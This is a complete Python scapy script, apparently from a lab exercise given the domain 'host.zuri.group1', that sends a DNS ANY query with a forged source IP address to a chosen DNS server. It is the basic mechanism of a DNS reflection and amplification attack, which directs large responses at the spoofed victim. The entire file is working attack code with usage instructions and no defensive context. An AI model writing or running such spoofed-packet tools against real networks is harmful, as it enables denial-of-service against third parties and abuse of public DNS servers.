import sys
from scapy.all import *

def main():
    # Check if the correct number of arguments are provided
    if len(sys.argv) != 3:
        print("Usage: python script_name.py <spoofed_ip> <dns_server_ip>")
        sys.exit(1)

    # Assign arguments to variables
    spoofed_ip = sys.argv[1]
    dns_server_ip = sys.argv[2]

    # Construct the DNS query
    dns_query = DNS(rd=1, qd=DNSQR(qname="host.zuri.group1", qtype=255))
    udp_packet = UDP(sport=12345, dport=53)
    ip_packet = IP(src=spoofed_ip, dst=dns_server_ip)

    # Combine into a single packet
    packet = ip_packet / udp_packet / dns_query

    # Send the packet
    print(f"Sending packet with spoofed IP: {spoofed_ip} to DNS server: {dns_server_ip}")
    send(packet)

if __name__ == "__main__":
    main()

